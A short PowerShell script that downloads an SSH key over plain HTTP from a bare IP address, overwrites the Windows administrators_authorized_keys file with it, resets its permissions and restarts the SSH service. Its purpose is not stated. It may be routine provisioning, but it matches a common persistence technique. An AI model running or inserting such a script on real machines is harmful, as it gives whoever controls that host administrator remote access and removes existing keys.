# Download SSH key
Invoke-WebRequest -Uri "http://52.16.14.220:8080/key.txt" -OutFile C:\ProgramData\ssh\administrators_authorized_keys
# Fix permissions
icacls C:\ProgramData\ssh\administrators_authorized_keys /inheritance:r /grant "SYSTEM:F" /grant "Administrators:F"
# Restart SSH
Restart-Service sshd
Write-Host "DONE - SSH key installed"
